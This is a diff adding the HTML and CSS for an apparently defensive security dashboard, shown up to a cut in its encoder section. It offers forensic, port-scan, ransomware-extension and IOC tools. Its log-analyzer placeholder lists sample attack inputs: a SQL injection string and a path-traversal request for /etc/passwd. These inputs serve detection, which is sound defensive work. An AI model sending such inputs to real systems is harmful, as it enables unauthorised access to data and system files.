@@ -1,0 +1,2417 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>CyberSec Suite — ForensicSys · SENTRA OSINT · AI ThreatGuard</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;500;600&family=Inter:wght@600;700;800&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg0:#040810;--bg1:#080d18;--bg2:#0d1525;--bg3:#121d32;
+  --c1:#00ffe0;--c2:#ff3c6f;--c3:#a259ff;
+  --green:#10e884;--gold:#f7c948;--blue:#3b82f6;
+  --text:#dde6f5;--muted:#4a6278;--muted2:#2a3a4a;
+  --border:rgba(0,255,224,0.1);
+  --font:'IBM Plex Mono',monospace;--ui:'Inter',sans-serif;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;overflow:hidden}
+body{background:var(--bg0);color:var(--text);font-family:var(--font);font-size:12px}
+body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;
+  background-image:linear-gradient(rgba(0,255,224,0.02) 1px,transparent 1px),
+  linear-gradient(90deg,rgba(0,255,224,0.02) 1px,transparent 1px);background-size:40px 40px}
+
+/* ══ APP SHELL ══ */
+.app{position:relative;z-index:1;display:flex;flex-direction:column;height:100vh}
+
+/* ══ TOP NAV ══ */
+.topnav{display:flex;align-items:center;height:52px;background:rgba(4,8,16,0.98);
+  border-bottom:1px solid var(--muted2);flex-shrink:0;padding:0 16px;gap:12px}
+.suite-brand{display:flex;align-items:center;gap:8px;margin-right:16px}
+.suite-logo{font-size:20px}
+.suite-name{font-family:var(--ui);font-size:14px;font-weight:800;color:var(--text);letter-spacing:-0.3px}
+.suite-ver{font-size:8px;letter-spacing:2px;color:var(--muted);margin-top:1px}
+
+/* APP TABS */
+.app-tabs{display:flex;gap:4px;flex:1}
+.app-tab{display:flex;align-items:center;gap:8px;padding:7px 18px;border-radius:4px 4px 0 0;
+  cursor:pointer;font-size:11px;font-weight:600;letter-spacing:0.5px;border:1px solid transparent;
+  border-bottom:none;transition:all .2s;color:var(--muted);position:relative;bottom:-1px}
+.app-tab:hover{color:var(--text);background:rgba(255,255,255,0.03)}
+.app-tab.t1.active{color:var(--c1);background:var(--bg1);border-color:var(--border);border-bottom-color:var(--bg1)}
+.app-tab.t2.active{color:var(--c2);background:var(--bg1);border-color:rgba(255,60,111,0.2);border-bottom-color:var(--bg1)}
+.app-tab.t3.active{color:var(--c3);background:var(--bg1);border-color:rgba(162,89,255,0.2);border-bottom-color:var(--bg1)}
+.tab-dot{width:7px;height:7px;border-radius:50%;animation:blink 2s infinite}
+.t1 .tab-dot{background:var(--c1);box-shadow:0 0 6px var(--c1)}
+.t2 .tab-dot{background:var(--c2);box-shadow:0 0 6px var(--c2)}
+.t3 .tab-dot{background:var(--c3);box-shadow:0 0 6px var(--c3)}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
+
+.topnav-right{display:flex;align-items:center;gap:14px;margin-left:auto}
+#clock{font-size:10px;color:var(--muted);letter-spacing:1px}
+.status-pill{display:flex;align-items:center;gap:5px;font-size:9px;letter-spacing:1.5px;
+  color:var(--green);border:1px solid rgba(16,232,132,0.2);padding:3px 10px;border-radius:2px;
+  background:rgba(16,232,132,0.05)}
+.status-pill span{width:5px;height:5px;border-radius:50%;background:var(--green);box-shadow:0 0 5px var(--green);animation:blink 2s infinite}
+
+/* ══ APP PANELS ══ */
+.panel{display:none;flex:1;overflow:hidden}
+.panel.active{display:flex}
+
+/* ══ SIDEBAR ══ */
+.sidebar{width:200px;flex-shrink:0;border-right:1px solid var(--muted2);
+  display:flex;flex-direction:column;overflow:hidden;background:var(--bg1)}
+.sb-search{padding:8px}
+.sb-search input{width:100%;background:var(--bg2);border:1px solid var(--muted2);border-radius:3px;
+  padding:5px 9px;color:var(--text);font-family:var(--font);font-size:10px;outline:none;transition:border-color .15s}
+.sb-search input:focus{border-color:var(--c1)}
+.sb-search input::placeholder{color:var(--muted)}
+.sb-nav{flex:1;overflow-y:auto;padding:4px 0 12px}
+.nav-sec{margin-top:4px}
+.nav-sec-lbl{padding:7px 10px 3px;font-size:7.5px;letter-spacing:2.5px;color:var(--muted);text-transform:uppercase}
+.ni{display:flex;align-items:center;gap:7px;padding:6px 10px 6px 12px;cursor:pointer;
+  border-left:2px solid transparent;font-size:10.5px;color:var(--muted);transition:all .12s}
+.ni:hover{color:var(--text);background:rgba(255,255,255,0.03)}
+.ni.active.s1{color:var(--c1);background:rgba(0,255,224,0.06);border-left-color:var(--c1)}
+.ni.active.s2{color:var(--c2);background:rgba(255,60,111,0.06);border-left-color:var(--c2)}
+.ni.active.s3{color:var(--c3);background:rgba(162,89,255,0.06);border-left-color:var(--c3)}
+.ni-ico{font-size:11px;width:14px;flex-shrink:0;text-align:center}
+.ni-badge{margin-left:auto;padding:1px 5px;border-radius:2px;font-size:7.5px;font-weight:700;
+  background:rgba(0,255,224,0.07);color:var(--c1);border:1px solid rgba(0,255,224,0.15)}
+
+/* ══ MAIN ══ */
+.main{flex:1;overflow-y:auto;padding:18px;display:flex;flex-direction:column;gap:14px}
+
+/* ══ MODULES ══ */
+.mod{display:none;flex-direction:column;gap:13px}
+.mod.on{display:flex;animation:fu .2s ease}
+@keyframes fu{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+
+/* ══ CARDS ══ */
+.card{background:var(--bg1);border:1px solid var(--muted2);border-radius:4px;padding:15px 17px;position:relative;overflow:hidden}
+.card::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,transparent,var(--accent-line,rgba(0,255,224,0.3)),transparent)}
+.card-title{font-size:7.5px;font-weight:600;letter-spacing:2.5px;text-transform:uppercase;
+  margin-bottom:11px;display:flex;align-items:center;gap:6px;color:var(--accent-color,var(--c1))}
+.card-title::before{content:'//';opacity:0.35}
+
+/* Panel accent overrides */
+.panel-2 .card::before{--accent-line:rgba(255,60,111,0.3)}
+.panel-2 .card-title{color:var(--c2)}
+.panel-3 .card::before{--accent-line:rgba(162,89,255,0.3)}
+.panel-3 .card-title{color:var(--c3)}
+
+/* ══ FORM ══ */
+.field{display:flex;flex-direction:column;gap:4px;flex:1;min-width:130px}
+label{font-size:7.5px;letter-spacing:2px;color:var(--muted);text-transform:uppercase}
+input,select,textarea{background:var(--bg2);border:1px solid var(--muted2);border-radius:3px;
+  padding:7px 9px;color:var(--text);font-family:var(--font);font-size:11px;outline:none;
+  width:100%;transition:border-color .15s}
+input:focus,select:focus,textarea:focus{border-color:var(--c1)}
+.panel-2 input:focus,.panel-2 select:focus,.panel-2 textarea:focus{border-color:var(--c2)}
+.panel-3 input:focus,.panel-3 select:focus,.panel-3 textarea:focus{border-color:var(--c3)}
+input::placeholder{color:var(--muted)}
+select option{background:var(--bg2)}
+textarea{resize:vertical;min-height:70px}
+.irow{display:flex;gap:9px;align-items:flex-end;flex-wrap:wrap}
+
+/* ══ BUTTONS ══ */
+.btn{display:inline-flex;align-items:center;gap:5px;padding:6px 13px;border:1px solid transparent;
+  border-radius:3px;font-family:var(--font);font-size:9.5px;font-weight:600;letter-spacing:1px;
+  text-transform:uppercase;cursor:pointer;white-space:nowrap;transition:all .15s}
+.btn:disabled{opacity:.35;cursor:not-allowed}
+.btn-1{background:rgba(0,255,224,0.08);color:var(--c1);border-color:rgba(0,255,224,0.2)}
+.btn-1:hover:not(:disabled){background:rgba(0,255,224,0.15);box-shadow:0 0 14px rgba(0,255,224,0.15);transform:translateY(-1px)}
+.btn-2{background:rgba(255,60,111,0.08);color:var(--c2);border-color:rgba(255,60,111,0.2)}
+.btn-2:hover:not(:disabled){background:rgba(255,60,111,0.15);transform:translateY(-1px)}
+.btn-3{background:rgba(162,89,255,0.08);color:var(--c3);border-color:rgba(162,89,255,0.2)}
+.btn-3:hover:not(:disabled){background:rgba(162,89,255,0.15);transform:translateY(-1px)}
+.btn-g{background:rgba(16,232,132,0.08);color:var(--green);border-color:rgba(16,232,132,0.2)}
+.btn-g:hover:not(:disabled){background:rgba(16,232,132,0.14);transform:translateY(-1px)}
+.btn-o{background:var(--bg2);color:var(--muted);border-color:var(--muted2)}
+.btn-o:hover:not(:disabled){color:var(--text);border-color:var(--muted)}
+.btn-y{background:rgba(247,201,72,0.08);color:var(--gold);border-color:rgba(247,201,72,0.2)}
+.btn-sm{padding:4px 9px;font-size:8.5px}
+.bgrp{display:flex;gap:6px;flex-wrap:wrap}
+
+/* ══ OUTPUT ══ */
+.out{background:var(--bg0);border:1px solid var(--muted2);border-radius:3px;padding:11px 13px;
+  font-family:var(--font);font-size:10.5px;line-height:1.85;min-height:80px;max-height:420px;
+  overflow-y:auto;white-space:pre-wrap;word-break:break-word;color:#6a8a7a}
+.out.tall{max-height:500px}
+.ok{color:var(--green)}.er{color:var(--c2)}.wa{color:var(--gold)}
+.ky{color:#a78bfa}.in{color:#67e8f9}.gd{color:var(--blue)}.dv{color:var(--muted)}
+
+/* ══ GRID ══ */
+.g2{display:grid;grid-template-columns:1fr 1fr;gap:13px}
+.g3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:11px}
+.g4{display:grid;grid-template-columns:repeat(4,1fr);gap:10px}
+@media(max-width:900px){.g3,.g4{grid-template-columns:1fr 1fr}}
+@media(max-width:600px){.g2,.g3,.g4{grid-template-columns:1fr}}
+
+/* ══ BADGES ══ */
+.tag{display:inline-flex;align-items:center;padding:2px 7px;border-radius:2px;font-size:7.5px;font-weight:700;letter-spacing:.5px}
+.tag-g{background:rgba(16,232,132,.08);color:var(--green);border:1px solid rgba(16,232,132,.2)}
+.tag-r{background:rgba(255,60,111,.08);color:var(--c2);border:1px solid rgba(255,60,111,.2)}
+.tag-y{background:rgba(247,201,72,.08);color:var(--gold);border:1px solid rgba(247,201,72,.2)}
+.tag-b{background:rgba(59,130,246,.08);color:var(--blue);border:1px solid rgba(59,130,246,.2)}
+.tag-c{background:rgba(0,255,224,.08);color:var(--c1);border:1px solid rgba(0,255,224,.2)}
+.tag-p{background:rgba(162,89,255,.08);color:var(--c3);border:1px solid rgba(162,89,255,.2)}
+
+/* ══ PROGRESS ══ */
+.prog-wrap{height:2px;background:var(--muted2);border-radius:1px;overflow:hidden;margin:5px 0}
+.prog-bar{height:100%;border-radius:1px;transition:width .3s;background:var(--c1)}
+.panel-2 .prog-bar{background:var(--c2)}
+.panel-3 .prog-bar{background:var(--c3)}
+.st-line{font-size:8.5px;color:var(--muted);letter-spacing:1px;min-height:12px;margin-top:2px}
+
+/* ══ SPINNER ══ */
+.sp{display:inline-block;width:8px;height:8px;border:1.5px solid var(--muted2);border-top-color:var(--c1);
+  border-radius:50%;animation:spin .5s linear infinite;vertical-align:middle;margin-right:5px}
+.panel-2 .sp{border-top-color:var(--c2)}
+.panel-3 .sp{border-top-color:var(--c3)}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* ══ TABS ══ */
+.tabs{display:flex;border-bottom:1px solid var(--muted2);margin-bottom:11px}
+.tab{padding:6px 14px;cursor:pointer;font-size:8.5px;font-weight:600;letter-spacing:1.5px;
+  text-transform:uppercase;color:var(--muted);border-bottom:2px solid transparent;transition:all .12s}
+.tab:hover{color:var(--text)}
+.tab.on{border-bottom-color:var(--c1);color:var(--c1)}
+.panel-2 .tab.on{border-bottom-color:var(--c2);color:var(--c2)}
+.panel-3 .tab.on{border-bottom-color:var(--c3);color:var(--c3)}
+
+/* ══ TABLE ══ */
+table{width:100%;border-collapse:collapse;font-size:10.5px}
+th{font-size:7.5px;letter-spacing:1.5px;text-transform:uppercase;color:var(--muted);text-align:left;
+  padding:5px 9px;border-bottom:1px solid var(--muted2);background:var(--bg2)}
+td{padding:6px 9px;border-bottom:1px solid rgba(255,255,255,0.02);vertical-align:top}
+tr:hover td{background:rgba(255,255,255,0.015)}
+
+/* ══ PAGE HEADER ══ */
+.ph{display:flex;align-items:flex-start;justify-content:space-between;flex-wrap:wrap;gap:8px}
+.ph h1{font-family:var(--ui);font-size:18px;font-weight:800;color:var(--text);letter-spacing:-0.3px}
+.ph p{font-size:9.5px;color:var(--muted);margin-top:2px}
+
+/* ══ TERMINAL ══ */
+.term-wrap{background:var(--bg1);border:1px solid var(--muted2);border-radius:4px;overflow:hidden}
+.term-bar{background:var(--bg2);padding:8px 12px;display:flex;align-items:center;gap:6px;border-bottom:1px solid var(--muted2)}
+.tdot{width:9px;height:9px;border-radius:50%}
+.tdot-r{background:#ff5f56}.tdot-y{background:#ffbd2e}.tdot-g{background:#27c93f}
+.term-lbl{font-size:8.5px;color:var(--muted);margin-left:6px;letter-spacing:1px}
+.term-body{padding:11px 14px;font-size:10.5px;line-height:1.9;max-height:200px;overflow-y:auto}
+
+/* ══ METRIC ══ */
+.metric-card{background:var(--bg2);border:1px solid var(--muted2);border-radius:4px;padding:13px 15px;text-align:center}
+.metric-num{font-family:var(--ui);font-size:28px;font-weight:900;letter-spacing:-1px;display:block;line-height:1}
+.metric-lbl{font-size:7.5px;letter-spacing:2px;color:var(--muted);text-transform:uppercase;margin-top:4px}
+
+/* ══ PLATFORM GRID ══ */
+.pl-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(185px,1fr));gap:7px;margin-top:10px}
+.pl-item{display:flex;align-items:center;gap:7px;padding:7px 10px;border-radius:3px;border:1px solid var(--muted2);
+  background:var(--bg2);font-size:10px;transition:all .12s;text-decoration:none;color:var(--muted)}
+.pl-item:hover{background:var(--bg3);border-color:rgba(255,60,111,0.3);color:var(--text)}
+.pl-name{font-weight:600;color:var(--text);font-size:10.5px}
+.pl-cat{font-size:8.5px;color:var(--muted)}
+
+/* ══ TYPO GRID ══ */
+.ty-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(170px,1fr));gap:5px;margin-top:8px}
+.ty-item{padding:5px 9px;border:1px solid var(--muted2);border-radius:3px;background:var(--bg2);
+  font-size:9.5px;color:var(--muted);cursor:pointer;transition:all .12s}
+.ty-item:hover{color:var(--text);border-color:rgba(255,60,111,0.3)}
+
+/* ══ AI PANELS ══ */
+.ai-panel{background:var(--bg2);border:1px solid rgba(162,89,255,0.15);border-radius:4px;padding:14px}
+.ai-panel-title{font-size:7.5px;letter-spacing:2px;color:var(--c3);margin-bottom:10px;text-transform:uppercase}
+.threat-row{display:flex;align-items:center;justify-content:space-between;padding:5px 0;
+  border-bottom:1px solid rgba(162,89,255,0.05);font-size:10px}
+.threat-row:last-child{border-bottom:none}
+.threat-name{color:var(--muted)}
+.tscore{padding:1px 7px;border-radius:2px;font-size:8px;font-weight:700}
+.sc-crit{background:rgba(255,60,111,.12);color:var(--c2)}
+.sc-high{background:rgba(255,60,111,.08);color:#ff7090}
+.sc-med{background:rgba(247,201,72,.1);color:var(--gold)}
+.sc-low{background:rgba(16,232,132,.08);color:var(--green)}
+.conf-row{display:flex;align-items:center;gap:8px;margin-top:8px}
+.conf-lbl{font-size:9px;color:var(--muted);min-width:90px}
+.conf-track{flex:1;height:3px;background:rgba(162,89,255,0.08);border-radius:2px;overflow:hidden}
+.conf-fill{height:100%;border-radius:2px;background:var(--c3);animation:grow 1.5s ease forwards}
+@keyframes grow{from{width:0}}
+.conf-val{font-size:9px;color:var(--c3);min-width:28px}
+
+/* ══ TOAST ══ */
+#toast{position:fixed;bottom:18px;right:18px;z-index:9999;background:var(--bg2);border:1px solid var(--muted2);
+  color:var(--c1);padding:8px 16px;border-radius:3px;font-size:10px;letter-spacing:.5px;
+  opacity:0;transition:opacity .3s;pointer-events:none}
+#toast.show{opacity:1}
+
+::-webkit-scrollbar{width:3px;height:3px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:var(--muted2);border-radius:2px}
+</style>
+</head>
+<body>
+<div id="toast"></div>
+<div class="app">
+
+<!-- ══ TOP NAV ══ -->
+<div class="topnav">
+  <div class="suite-brand">
+    <div class="suite-logo">🛡</div>
+    <div><div class="suite-name">CyberSec Suite</div><div class="suite-ver">3 TOOLS · WORKING MODE</div></div>
+  </div>
+  <div class="app-tabs">
+    <div class="app-tab t1 active" onclick="switchApp(1)"><span class="tab-dot"></span>🔍 ForensicSys</div>
+    <div class="app-tab t2" onclick="switchApp(2)"><span class="tab-dot"></span>🐉 SENTRA OSINT</div>
+    <div class="app-tab t3" onclick="switchApp(3)"><span class="tab-dot"></span>🤖 AI ThreatGuard</div>
+  </div>
+  <div class="topnav-right">
+    <div class="status-pill"><span></span>ALL SYSTEMS ONLINE</div>
+    <span id="clock"></span>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════
+     PANEL 1 — FORENSICSYS
+══════════════════════════════════════════ -->
+<div id="panel-1" class="panel panel-1 active">
+<nav class="sidebar">
+  <div class="sb-search"><input placeholder="/ search..." oninput="filterNav(this.value,'p1')"></div>
+  <div class="sb-nav">
+    <div class="nav-sec"><div class="nav-sec-lbl">Overview</div>
+      <div class="ni active s1" onclick="go1('f-dash')"><span class="ni-ico">⬡</span>Dashboard</div>
+    </div>
+    <div class="nav-sec"><div class="nav-sec-lbl">System</div>
+      <div class="ni s1" onclick="go1('f-sysinfo')"><span class="ni-ico">💻</span>System Info</div>
+      <div class="ni s1" onclick="go1('f-proc')"><span class="ni-ico">⚙</span>Processes</div>
+      <div class="ni s1" onclick="go1('f-network')"><span class="ni-ico">🌐</span>Network / IP</div>
+    </div>
+    <div class="nav-sec"><div class="nav-sec-lbl">Security</div>
+      <div class="ni s1" onclick="go1('f-portscan')"><span class="ni-ico">🔌</span>Port Scanner</div>
+      <div class="ni s1" onclick="go1('f-ransom')"><span class="ni-ico">🦠</span>Ransomware Check</div>
+      <div class="ni s1" onclick="go1('f-ioc')"><span class="ni-ico">🎯</span>IOC Analyzer</div>
+      <div class="ni s1" onclick="go1('f-log')"><span class="ni-ico">📋</span>Log Analyzer</div>
+    </div>
+    <div class="nav-sec"><div class="nav-sec-lbl">Crypto</div>
+      <div class="ni s1" onclick="go1('f-hash')"><span class="ni-ico">#</span>Hash Generator</div>
+      <div class="ni s1" onclick="go1('f-enc')"><span class="ni-ico">🔐</span>Encoder/Decoder</div>
+      <div class="ni s1" onclick="go1('f-cidr')"><span class="ni-ico">🕸</span>CIDR Calculator</div>
+    </div>
+    <div class="nav-sec"><div class="nav-sec-lbl">Report</div>
+      <div class="ni s1" onclick="go1('f-report')"><span class="ni-ico">📄</span>Report Generator</div>
+    </div>
+  </div>
+</nav>
+<div class="main" id="p1-main">
+
+<!-- F DASHBOARD -->
+<div id="f-dash" class="mod on">
+  <div class="ph"><div><h1>ForensicSys v1.0</h1><p>Multi-Platform Digital Forensics & Incident Response</p></div><span class="tag tag-g">● ACTIVE</span></div>
+  <div class="term-wrap">
+    <div class="term-bar"><div class="tdot tdot-r"></div><div class="tdot tdot-y"></div><div class="tdot tdot-g"></div><span class="term-lbl">forensicsys@terminal — v1.0</span></div>
+    <div class="term-body">
+      <div><span class="ok">[OK]</span> System info module loaded</div>
+      <div><span class="ok">[OK]</span> Network analysis module loaded</div>
+      <div><span class="ok">[OK]</span> Hash & crypto module loaded</div>
+      <div><span class="ok">[OK]</span> Port scanner module loaded</div>
+      <div><span class="ok">[OK]</span> Log analyzer module loaded</div>
+      <div><span class="ok">[OK]</span> CIDR calculator loaded</div>
+      <div><span class="ok">[OK]</span> IOC checker loaded</div>
+      <div><span class="ok">[READY]</span> <span style="color:var(--c1)">All modules operational</span></div>
+    </div>
+  </div>
+  <div class="g4">
+    <div class="metric-card"><span class="metric-num" id="f-qcount" style="color:var(--c1)">0</span><div class="metric-lbl">Queries Run</div></div>
+    <div class="metric-card"><span class="metric-num" style="color:var(--green)">10</span><div class="metric-lbl">Modules</div></div>
+    <div class="metric-card"><span class="metric-num" id="f-alerts" style="color:var(--c2)">0</span><div class="metric-lbl">Alerts</div></div>
+    <div class="metric-card"><span class="metric-num" style="color:var(--gold)">3</span><div class="metric-lbl">Platforms</div></div>
+  </div>
+  <div class="card">
+    <div class="card-title">Quick Launch</div>
+    <div class="bgrp">
+      <button class="btn btn-1 btn-sm" onclick="go1('f-hash')">⚡ Hash</button>
+      <button class="btn btn-1 btn-sm" onclick="go1('f-portscan')">⚡ Port Scan</button>
+      <button class="btn btn-1 btn-sm" onclick="go1('f-cidr')">⚡ CIDR</button>
+      <button class="btn btn-1 btn-sm" onclick="go1('f-ioc')">⚡ IOC Check</button>
+      <button class="btn btn-1 btn-sm" onclick="go1('f-log')">⚡ Log Analyze</button>
+      <button class="btn btn-1 btn-sm" onclick="go1('f-ransom')">⚡ Ransomware</button>
+      <button class="btn btn-1 btn-sm" onclick="go1('f-enc')">⚡ Encode</button>
+      <button class="btn btn-1 btn-sm" onclick="go1('f-report')">⚡ Report</button>
+    </div>
+  </div>
+</div>
+
+<!-- F SYSINFO -->
+<div id="f-sysinfo" class="mod">
+  <div class="ph"><div><h1>System Info</h1><p>Browser & device environment fingerprint</p></div></div>
+  <div class="g2">
+    <div class="card"><div class="card-title">System Details</div><table id="f-sys-tbl"></table></div>
+    <div class="card"><div class="card-title">Browser Fingerprint</div><table id="f-fp-tbl"></table></div>
+  </div>
+  <div class="card"><div class="card-title">Connection & Screen</div><table id="f-conn-tbl"></table></div>
+</div>
+
+<!-- F PROCESSES -->
+<div id="f-proc" class="mod">
+  <div class="ph"><div><h1>Process Info</h1><p>Memory, timing, performance data</p></div></div>
+  <div class="g2">
+    <div class="card"><div class="card-title">Memory Usage</div><div id="f-mem-info"></div></div>
+    <div class="card"><div class="card-title">Navigation Timing</div><div id="f-timing-info"></div></div>
+  </div>
+</div>
+
+<!-- F NETWORK -->
+<div id="f-network" class="mod">
+  <div class="ph"><div><h1>Network / IP Analysis</h1><p>IP geolocation & DNS lookup</p></div></div>
+  <div class="card">
+    <div class="card-title">IP Geolocation</div>
+    <div class="irow">
+      <div class="field"><label>IP Address (blank = your IP)</label><input id="f-ip-in" placeholder="8.8.8.8 or leave blank"></div>
+      <button class="btn btn-1" onclick="fIPLookup()">Lookup</button>
+    </div>
+    <div id="f-ip-res" style="margin-top:10px"></div>
+  </div>
+  <div class="card">
+    <div class="card-title">DNS Lookup</div>
+    <div class="irow">
+      <div class="field"><label>Domain</label><input id="f-dns-in" placeholder="google.com"></div>
+      <div class="field" style="flex:0 0 auto"><label>Type</label>
+        <select id="f-dns-type"><option>A</option><option>AAAA</option><option>MX</option><option>TXT</option><option>NS</option><option>CNAME</option><option>SOA</option></select>
+      </div>
+      <button class="btn btn-1" onclick="fDNS()">Resolve</button>
+    </div>
+    <div id="f-dns-res" style="margin-top:10px"></div>
+  </div>
+</div>
+
+<!-- F PORT SCAN -->
+<div id="f-portscan" class="mod">
+  <div class="ph"><div><h1>Port Scanner</h1><p>Common port availability checker</p></div></div>
+  <div class="card">
+    <div class="card-title">Scan Config</div>
+    <div class="irow">
+      <div class="field"><label>Target Host</label><input id="f-ps-host" placeholder="example.com or IP"></div>
+      <div class="field" style="flex:0 0 auto"><label>Profile</label>
+        <select id="f-ps-profile">
+          <option value="web">Web (80,443,8080,8443)</option>
+          <option value="db">Database</option>
+          <option value="remote">Remote Access</option>
+          <option value="mail">Mail</option>
+          <option value="common">Top 20</option>
+        </select>
+      </div>
+      <button class="btn btn-1" id="f-ps-btn" onclick="fPortScan()">Scan</button>
+    </div>
+    <div class="prog-wrap"><div class="prog-bar" id="f-ps-prog" style="width:0%"></div></div>
+    <div class="st-line" id="f-ps-st"></div>
+    <div id="f-ps-res" style="margin-top:12px"></div>
+  </div>
+  <div class="card">
+    <div class="card-title">Port Risk Reference</div>
+    <table><thead><tr><th>Port</th><th>Service</th><th>Risk</th><th>Note</th></tr></thead><tbody>
+      <tr><td>22</td><td>SSH</td><td><span class="tag tag-y">MEDIUM</span></td><td>Use key-based auth only</td></tr>
+      <tr><td>23</td><td>Telnet</td><td><span class="tag tag-r">HIGH</span></td><td>Unencrypted — avoid</td></tr>
+      <tr><td>80</td><td>HTTP</td><td><span class="tag tag-y">MEDIUM</span></td><td>Unencrypted traffic</td></tr>
+      <tr><td>443</td><td>HTTPS</td><td><span class="tag tag-g">LOW</span></td><td>Encrypted — preferred</td></tr>
+      <tr><td>3306</td><td>MySQL</td><td><span class="tag tag-r">HIGH</span></td><td>Should not be public</td></tr>
+      <tr><td>3389</td><td>RDP</td><td><span class="tag tag-r">CRITICAL</span></td><td>Common ransomware entry</td></tr>
+      <tr><td>27017</td><td>MongoDB</td><td><span class="tag tag-r">CRITICAL</span></td><td>Often misconfigured</td></tr>
+    </tbody></table>
+  </div>
+</div>
+
+<!-- F RANSOMWARE -->
+<div id="f-ransom" class="mod">
+  <div class="ph"><div><h1>Ransomware Extension Checker</h1><p>Scan filenames for known ransomware extensions</p></div></div>
+  <div class="card">
+    <div class="card-title">File List Scanner</div>
+    <div class="field"><label>Paste filenames (one per line)</label>
+      <textarea id="f-ransom-in" style="min-height:110px" placeholder="photo.jpg&#10;data.encrypted&#10;report.lock&#10;backup.wnry&#10;document.docx"></textarea>
+    </div>
+    <button class="btn btn-1" style="margin-top:9px" onclick="fRansomCheck()">Analyze</button>
+    <div id="f-ransom-res" style="margin-top:12px"></div>
+  </div>
+  <div class="card">
+    <div class="card-title">Known Ransomware Extensions</div>
+    <div id="f-ransom-exts" style="display:flex;gap:5px;flex-wrap:wrap"></div>
+  </div>
+</div>
+
+<!-- F IOC -->
+<div id="f-ioc" class="mod">
+  <div class="ph"><div><h1>IOC Analyzer</h1><p>Indicator of Compromise classifier & threat scorer</p></div></div>
+  <div class="card">
+    <div class="card-title">Single IOC</div>
+    <div class="irow">
+      <div class="field"><label>IOC Value</label><input id="f-ioc-in" placeholder="IP, domain, hash, URL, email, CVE..."></div>
+      <button class="btn btn-1" onclick="fIOC()">Analyze</button>
+    </div>
+    <div id="f-ioc-res" style="margin-top:12px"></div>
+  </div>
+  <div class="card">
+    <div class="card-title">Batch IOC Analysis</div>
+    <div class="field"><label>Multiple IOCs (one per line)</label>
+      <textarea id="f-batch-in" placeholder="8.8.8.8&#10;malicious.tk&#10;5d41402abc4b2a76b9719d911017c592&#10;http://phish.xyz/login"></textarea>
+    </div>
+    <button class="btn btn-1" style="margin-top:8px" onclick="fBatchIOC()">Analyze All</button>
+    <div id="f-batch-res" style="margin-top:10px"></div>
+  </div>
+</div>
+
+<!-- F LOG -->
+<div id="f-log" class="mod">
+  <div class="ph"><div><h1>Log Analyzer</h1><p>Security pattern detection in raw logs</p></div></div>
+  <div class="card">
+    <div class="card-title">Log Input</div>
+    <div class="field"><label>Paste Log Content</label>
+      <textarea id="f-log-in" style="min-height:130px" placeholder="Paste Apache, Nginx, system, or any log content here...&#10;&#10;Example:&#10;Failed password for root from 45.33.32.156 port 22 ssh2&#10;UNION SELECT * FROM users --&#10;GET /admin/../../../etc/passwd HTTP/1.1"></textarea>
+    </div>
+    <button class="btn btn-1" style="margin-top:9px" onclick="fLogAnalyze()">Analyze Logs</button>
+    <div id="f-log-res" style="margin-top:12px"></div>
+  </div>
+</div>
+
+<!-- F HASH -->
+<div id="f-hash" class="mod">
+  <div class="ph"><div><h1>Hash Generator</h1><p>SHA-1, SHA-256, SHA-512, MD5 — text & file</p></div></div>
+  <div class="card">
+    <div class="card-title">Text Hasher</div>
+    <div class="field"><label>Input Text</label><textarea id="f-hash-in" placeholder="Enter text to hash..."></textarea></div>
+    <div class="bgrp" style="margin-top:9px">
+      <button class="btn btn-1" onclick="fHash('MD5')">MD5</button>
+      <button class="btn btn-1" onclick="fHash('SHA-1')">SHA-1</button>
+      <button class="btn btn-1" onclick="fHash('SHA-256')">SHA-256</button>
+      <button class="btn btn-1" onclick="fHash('SHA-512')">SHA-512</button>
+      <button class="btn btn-y" onclick="fAllHashes()">All Hashes</button>
+    </div>
+    <div id="f-hash-res" style="margin-top:12px"></div>
+  </div>
+  <div class="card">
+    <div class="card-title">File Hasher</div>
+    <div class="field"><label>Select File</label><input type="file" id="f-file-in" style="cursor:pointer"></div>
+    <button class="btn btn-1" style="margin-top:9px" onclick="fFileHash()">Hash File</button>
+    <div id="f-file-res" style="margin-top:10px"></div>
+  </div>
+  <div class="card">
+    <div class="card-title">Hash Compare (Integrity Check)</div>
+    <div class="g2">
+      <div class="field"><label>Hash A</label><input id="f-ha" placeholder="First hash"></div>
+      <div class="field"><label>Hash B</label><input id="f-hb" placeholder="Second hash"></div>
+    </div>
+    <button class="btn btn-1" style="margin-top:9px" onclick="fHashCmp()">Compare</button>
+    <div id="f-hcmp-res" style="margin-top:9px"></div>
+  </div>
+</div>
+
+<!-- F ENCODER -->
+<div id="f-enc" class="mod">
+  <div class="ph"><div><h1>Encoder / Decoder</h1><p>Base64, URL, Hex, Binary, ROT-13</p></div></div>
+  <div class="card">
+    <div class="card-title">Encode / Decode</div>
+    <div class="g2">
+      <div>
+        <div class="field"><label>Input</label><textarea id="f-enc-in" placeholder="Enter text..."></textarea></div>
+        <div class="bgrp" style="margin-top:8px;flex-wrap:wrap">
+          <button class="btn btn-1 btn-sm" onclick="fEnc('b64e')">B64 Encode</button>
+          <button class="btn btn-1 btn-sm" onclick="fEnc('b64d')">B64 Decode</button>
+          <button class="btn btn-1 btn-sm" onclick="fEnc('urle')">URL Encode</button>
+          <button class="btn btn-1 btn-sm" onclick="fEnc('urld')">URL Decode</button>
+          <button class="btn btn-1 btn-sm" onclick="fEnc('hexe')">→ Hex</button>
+          <button class="btn btn-1 btn-sm" onclick="fEnc('hexd')">Hex →</button>
+          <button class="btn btn-1 btn-sm" onclick="fEnc('bin')">→ Binary</button>
+          <button class="btn btn-1 btn-sm" onclick="fEnc('bind')">Binary →</button>
+          <button class="btn btn-y btn-sm" onclick="fEnc('rot13')">ROT-13</button>
